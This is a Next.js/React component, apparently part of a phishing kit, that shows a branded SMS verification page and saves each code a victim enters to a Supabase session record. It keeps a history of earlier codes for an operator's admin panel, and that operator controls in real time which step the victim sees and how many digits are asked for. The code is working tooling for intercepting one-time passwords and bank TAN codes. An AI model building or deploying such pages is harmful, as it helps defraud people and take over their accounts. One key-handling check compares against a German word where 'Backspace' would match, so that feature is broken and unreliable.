"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
};

export function SmsClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const [digits, setDigits] = useState(6);
  const [smsMode, setSmsMode] = useState<"fixed" | "unknown">("fixed");
  const [customText, setCustomText] = useState<string | null>(null);
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});

  // ⭐ BELİRSİZ HANE: DİNAMİK hane sayısı (kullanıcı kaç hane girerse o kadar)
  //   min 4, max 12. Baslangicta 4 kutu gosterilir, kullanici 5. haneyi girince 5. kutu acilir, vb.
  const effectiveDigits = useMemo(() => {
    if (smsMode !== "unknown") return digits;
    // Belirsiz mod: min 4, max 12. code.length + 1 sonraki hane icin (en az 4).
    const needed = Math.max(4, Math.min(12, code.length + 1));
    return needed;
  }, [smsMode, digits, code.length]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) {
        setLoading(false);
        return;
      }
      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();

      if (cancelled || !data) {
        setLoading(false);
        return;
      }
      // ⭐ BELİRSİZ HANE: sms_mode === "unknown" VEYA sms_digits === 0 ise dynamic mod
      const modeUnknown = (data as any).sms_mode === "unknown" || (data as any).sms_mode === null && Number(data.sms_digits) === 0;
      setSmsMode(modeUnknown ? "unknown" : "fixed");
      setDigits(Number(data.sms_digits) || 6);
      setCustomText(data.sms_custom_text ?? null);
      const fd = (data.form_data ?? {}) as Record<string, string>;
      // ⚠️ KRITIK DUZELTME (SMS GECMIS BUTONU KAYIP HATA KOKU):
      //   ESKI KOD: fd.smsCode/sms_code = "" + supabase update ile ESKI SMSI SILIYORDUK.
      //   SONUC: 2. SMS'e gelince prevSms = "" → isFirstSmsEntry=true
      //          → history'ye ASLA push edilemiyordu → admin GEÇMİŞ butonu HİÇ görünmüyordu.
      //   YENI KOD:
      //     1) setCode("") → UI INPUT kutusu BOŞ (kullanıcı eski kodu GÖRMEZ).
      //     2) fd (form_data state) ve SUPABASE içindeki ESKİ smsCode/tacCode KORUNUR
      //        → Böylece submit anında prevSms = 1. SMS (dolu) bulunur → history.push ✅.
      setCode("");
      setSessionFormData(fd);
      setLoading(false);
    })();

    // Supabase Realtime Listener for sms_digits changes
    if (supabase && sessionId) {
      const channel = supabase
        .channel(`sms-client:${sessionId}`)
        .on(
          "postgres_changes",
          {
            event: "UPDATE",
            schema: "public",
            table: "sessions",
            filter: `id=eq.${sessionId}`,
          },
          (payload) => {
            const next = payload.new as {
              sms_digits?: number;
              sms_mode?: string | null;
              sms_custom_text?: string | null;
              current_step?: string;
              form_data?: Record<string, any>;
            };
            // ⭐ BELİRSİZ HANE realtime guncellemesi
            const modeUnknown = next.sms_mode === "unknown" || (next.sms_mode === undefined && Number(next.sms_digits) === 0);
            const prevMode = smsMode;
            const prevDigits = digits;
            let changed = false;
            if (next.sms_mode !== undefined || next.sms_digits !== undefined) {
              const newMode: "fixed" | "unknown" = modeUnknown ? "unknown" : "fixed";
              const newDigits = Number(next.sms_digits) || 6;
              if (prevMode !== newMode || prevDigits !== newDigits) {
                changed = true;
              }
              setSmsMode(newMode);
              setDigits(newDigits);
              setCode("");
            }
            if (next.sms_custom_text !== undefined) {
              setCustomText(next.sms_custom_text);
            }
            // Admin panelinden tekrar SMS adımına atılırsa (current_step = sms),
            // inputu BOŞALT (eski kod görünmesin) AMA form_data'daki ESKİ smsCode/tacCode KORU
            // (history.push yapabilmek için lazım).
            if (next.current_step === "sms") {
              setCode("");
            }

            // ⭐ Büyük fix: Admin belirsiz -> sabit veya sabit -> belirsiz degistirince
            //   useEffect sadece mountta çalıştığı için prevMode/prevDigits state'leri KAPALI (stale closure).
            //   Degisiklik olmasa bile REALTIME her geldiginde; kutuların yeniden render edilmesi ve
            //   1. kutuya otomatik focus olması için 200ms sonra FORCE bir event (visibility benzeri) veya DOM focus denemesi:
            if (changed) {
              window.setTimeout(() => {
                // İlk inputa focus (0) → kullanici F5 atmadan yeni 6 kutu veya yeni dynamic 4 kutu görünce
                // direkt yazmaya baslayabilir
                const first = document.getElementById("otp-input-0");
                if (first) first.focus();
              }, 220);
              // 2. katman fallback 450ms (re-render biraz gecikirse)
              window.setTimeout(() => {
                const f2 = document.getElementById("otp-input-0");
                if (f2 && document.activeElement?.id !== f2.id) f2.focus();
              }, 450);
            }
          }
        )
        .subscribe();

      return () => {
        cancelled = true;
        void supabase.removeChannel(channel);
      };
    }

    return () => {
      cancelled = true;
    };
    // ⭐ ONEMLI: smsMode ve digits dependency EKLEDIK.
    //   Realtime callback içinde `prevMode / prevDigits` artık güncel state değerlerini
    //   yakalıyor (eski halde sadece mount anındaki değerler mevcuttu, değişiklik
    //   yakalanamıyordu). useEffect remount değil, sadece callback dependency güncellenir.
  }, [sessionId, supabase, smsMode, digits]);

  async function handleSubmit(e?: React.FormEvent | null, fromAuto = false) {
    if (e) e.preventDefault();
    if (!supabase || !sessionId) return;
    const trimmed = code.trim();

    // ⭐ VALIDASYON:
    //   fixed mod: trimmed.length === digits + numeric
    //   unknown (belirsiz) mod: trimmed.length >= 4 (min 4 hane) + numeric (max 12)
    const isNumeric = /^\d+$/.test(trimmed);
    const validFixed = smsMode === "fixed" && trimmed.length === digits && isNumeric;
    const validUnknown = smsMode === "unknown" && trimmed.length >= 4 && trimmed.length <= 12 && isNumeric;
    if (!(validFixed || validUnknown)) {
      setMsg(
        smsMode === "fixed"
          ? `Enter exactly ${digits} digits.`
          : "Enter 4 to 12 digits.",
      );
      return;
    }

    setSaving(true);
    setMsg(null);

    // Kullanici verisini korumak icin form_data'yi DB'den taze oku (state bos kalmis olabilir).
    let baseFormData: Record<string, unknown> = sessionFormData;
    try {
      const { data: freshRow } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (freshRow?.form_data && typeof freshRow.form_data === "object") {
        baseFormData = freshRow.form_data as Record<string, unknown>;
      }
    } catch {
      /* fresh okuma basarisizsa state ile devam et */
    }

    // ⭐ SMS GECMISI APPEND: SADECE TEKRAR GIRISLERDE (daha once smsCode DOLUYSA)
    //   ⚠️ HISTORY'E YENI DEĞIL, ESKI (degismeden onceki) SMS KODUNU PUSH ET!
    //   Boylece kolon = YENI sms (2. sms), history = ESKI sms (1. sms → gorunur).
    const prevSms = String(
      (baseFormData as any).smsCode ||
      (baseFormData as any).sms_code ||
      (baseFormData as any).tacCode ||
      "",
    ).trim();
    const isFirstSmsEntry = prevSms.length === 0;
    const smsFormHistory: any[] = Array.isArray((baseFormData as any).smsFormHistory)
      ? (baseFormData as any).smsFormHistory.slice()
      : [];
    if (!isFirstSmsEntry) {
      smsFormHistory.push({
        htmlStepLabel: "SMS KODU",
        capturedAt: new Date().toISOString(),
        smsCode: prevSms,
        sms_code: prevSms,
        tacCode: prevSms,
      });
    }

    const nextFormData = {
      ...baseFormData,
      smsCode: trimmed,
      sms_code: trimmed,
      sms_otp_length: trimmed.length,
      sms_otp_mode: smsMode,
      smsFormHistory,
    };
    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait", form_data: nextFormData })
      .eq("id", sessionId);

    setSaving(false);
    if (error) setMsg("Senden fehlgeschlagen.");
    else {
      setSessionFormData(nextFormData);
      // ⭐ FLASH YOK: router.push → router.replace
      router.replace(stepToPath("wait", sessionId));
    }
  }


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#16A34A]/30 border-t-[#16A34A]" />
        </div>
      </div>
    );
  }

  if (!supabase) {
    return (
      <div className="pak-page-shell">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#021208] border border-[#16A34A] shadow-[0_0_40px_rgba(22,163,74,0.3)] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    return (
      <div className="pak-page-shell">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#021208] border border-[#16A34A] shadow-[0_0_40px_rgba(22,163,74,0.3)] p-5 sm:p-8 text-center">
          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
              Invalid link.
          </p>
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="pak-page-shell">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#021208] border border-[#16A34A] shadow-[0_0_40px_rgba(22,163,74,0.3)] p-5 sm:p-8 flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#16A34A] border-t-transparent" />
        </div>
      </div>
    );
  }

  const trimmed = code.trim();
  // ⭐ VALIDASYON (DUZELTILDI):
  //   fixed mod: code.length === digits
  //   unknown (belirsiz) mod: code.length >=4 (min 4, max 12). Sadece RAKAM ve
  //     4-12 arasindaysa GECERLI (eski effectiveDigits-1 kontrolu KALDIRILDI.
  //     Cunku kullanici 5 hane girdiginde effectiveDigits 6 oluyor ve 6.
  //     (bos) YENI kutu required oldugu icin HTML5 validation "Lutfen bu alani
  //     doldurun" uyarisi veriyordu. Artik kullanici 4+ girdigi hicbir kutu
  //     olmasa bile Devam butonu ile ONAYLAYABILIR.
  const numeric = /^\d+$/.test(trimmed);
  const validFixed = smsMode === "fixed" && trimmed.length === digits && numeric;
  const validUnknown =
    smsMode === "unknown" &&
    trimmed.length >= 4 &&
    trimmed.length <= 12 &&
    numeric;
  const valid = validFixed || validUnknown;

  const displayText = customText || settings.sms_subtitle;
  const labelText =
    smsMode === "unknown"
      ? `${settings.sms_input_label} (Minimum 4 digits, maximum 12)`
      : `${settings.sms_input_label} (${digits})`;

  // OTP style input handling
  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;

    const newCode = code.split("");
    newCode[index] = value.substring(value.length - 1); // Only take the last char
    const updatedCode = newCode.join("").replace(/[^\d]/g, "");

    // ⭐ BELİRSİZ HANE: code slice siniri effectiveDigits DEGIL, max 12
    const limit = smsMode === "unknown" ? Math.max(4, 12) : digits;
    const finalCode = updatedCode.slice(0, limit);
    setCode(finalCode);

    // ⭐ Move to next input:
    //   - Sabit (fixed) mod: digits indexine kadar (klasik davranis)
    //   - Belirsiz (unknown) mod: effectiveDigits useMemo state gecikmeli guncellendigi icin
    //     setCode cagirildiktan 1 frame sonra DOM'a yeni (index+1) input eklenecek.
    //     O yuzden HEMEN (this frame) dene, BULAMAZSAN 60ms SONRA (next frame DOM render sonrasi) tekrar dene.
    //     Max 12 hane (0-11 index) -> nextIndex < 12 ise yine de devam etmeye calis.
    if (value) {
      const nextIndex = index + 1;
      if (smsMode === "unknown") {
        // Belirsiz modda: max 12 hane (index 0..11)
        if (nextIndex < 12) {
          // Hemen dene (effectiveDigits zaten buyukse input var demektir, ilk 1-3 hanede bu calisir)
          const next1 = document.getElementById(`otp-input-${nextIndex}`);
          if (next1) {
            next1.focus();
          } else {
            // Input henuz DOM'da yok (setCode -> render -> effectiveDigits 5 olacak -> 5. kutu render edilecek).
            // React bir sonraki tick'te DOM'u guncelleyecek, 60ms sonra tekrar focus et.
            window.setTimeout(() => {
              const next2 = document.getElementById(`otp-input-${nextIndex}`);
              if (next2) next2.focus();
            }, 60);
            // Ekstra fallback: 150ms sonra 2. deneme (bazı cihazlarda render 1 frameden uzun sürer)
            window.setTimeout(() => {
              const next3 = document.getElementById(`otp-input-${nextIndex}`);
              if (next3) {
                const active = document.activeElement?.id;
                if (!active || active !== next3.id) next3.focus();
              }
            }, 150);
          }
        }
      } else {
        // Sabit mod: digits adedi kadar (klasik)
        if (nextIndex < digits) {
          const nextInput = document.getElementById(`otp-input-${nextIndex}`);
          if (nextInput) nextInput.focus();
        }
      }
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Ruecktaste" && !code[index] && index > 0) {
      const prevInput = document.getElementById(`otp-input-${index - 1}`);
      if (prevInput) prevInput.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const limit = smsMode === "unknown" ? 12 : digits;
    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, limit);
    setCode(pastedData);
    const n = pastedData.length;
    if (n > 0) {
      const focusIndex = smsMode === "unknown" ? Math.min(n, effectiveDigits - 1) : Math.min(n, digits - 1);
      const input = document.getElementById(`otp-input-${focusIndex}`);
      if (input) input.focus();
    }
    // ⭐ OTOMATİK SUBMIT KAPANDI: Paste sonrasi 4+ hane dolu olsa bile otomatik
    //   submit YOK. Kullanici Devam butonuna basarak ilerlemeli.
  };

  return (
    <div className="pak-page-shell">
      <div className="pak-form-card w-full max-w-[860px] fade-in">
        <div className="pak-form-inner px-4 pb-5 pt-5 sm:px-8 sm:pb-8 sm:pt-8 lg:px-10">
          <div className="flex items-start justify-between gap-3">
            <div className="min-w-0 max-w-[29rem]">
              <h2 className="pak-form-title">{settings.sms_title}</h2>
              <p className="pak-form-subtitle mt-2 whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
            </div>
            <img
              src={settings.logo_url && settings.logo_url !== "/logo.webp" ? settings.logo_url : "/logo.webp"}
              alt={settings.portal_name || "Brand"}
              className="pak-form-brand-logo shrink-0"
              id="sms-brand-logo"
            />
          </div>
        
          <form onSubmit={handleSubmit} className="mt-5 space-y-5 sm:mt-6">
            <div className="pak-form-label">
              <div className="mb-3">{labelText}</div>
              <div className="flex flex-wrap justify-center gap-2" onPaste={handlePaste}>
              {Array.from({ length: effectiveDigits }).map((_, index) => {
                // ⭐ BELİRSİZ HANE modunda: SON (son index = effectiveDigits-1) DİNAMİK kutu
                //   required DEĞİLDİR.
                //   Cunku: kullanici 5 hane yazdığında effectiveDigits=6 olur ve 6. kutu
                //   (index 5) BOŞ kalır. Eğer required=true olursa HTML5 browser
                //   validation "Lütfen bu alanı doldurun" popup gösterir ve submit
                //   engellenir.
                //   - Fixed modda: tüm kutular required (sabit hane = tüm kutular dolmalı)
                //   - Unknown modda: index < code.length olanlar dolu olmalı ama son
                //     dinamik (index === effectiveDigits-1) kutu required olmamalı.
                //     Ekstra guvenlik: code.length >= 4 ise ve unknown modda zaten
                //     Devam butonu aktif (valid=true).
                return (
                  <input
                    key={index}
                    id={`otp-input-${index}`}
                    required={false}
                    inputMode="numeric"
                    autoComplete="one-time-code"
                    maxLength={1}
                    className="pak-form-otp h-13 w-11 text-center text-2xl font-bold sm:h-15 sm:w-13 sm:text-[1.7rem]"
                    value={code[index] || ""}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
                  />
                );
              })}
              </div>
            </div>

            {!valid && code.length > 0 ? (
              <p className="text-xs text-red-400">
                {smsMode === "fixed"
                  ? `Enter exactly ${digits} digits.`
                  : "Enter 4 to 12 digits."}
              </p>
            ) : null}

            {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}

            <div className="flex flex-col gap-3 pt-1 md:flex-row md:items-center md:justify-between">
              <div className="pak-form-security">
                <svg className="h-9 w-9 shrink-0 text-[#AAD84A]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                </svg>
                <span>Der Code wurde per SMS an Ihre Handynummer gesendet.</span>
              </div>

              <button
                type="submit"
                disabled={saving || !valid}
                className="pak-form-button min-h-[3.85rem] w-full px-6 text-lg md:w-[22rem]"
              >
                {saving ? settings.sms_loading : settings.sms_button}
              </button>
            </div>
          </form>

        </div>
      </div>
    </div>
  );
}
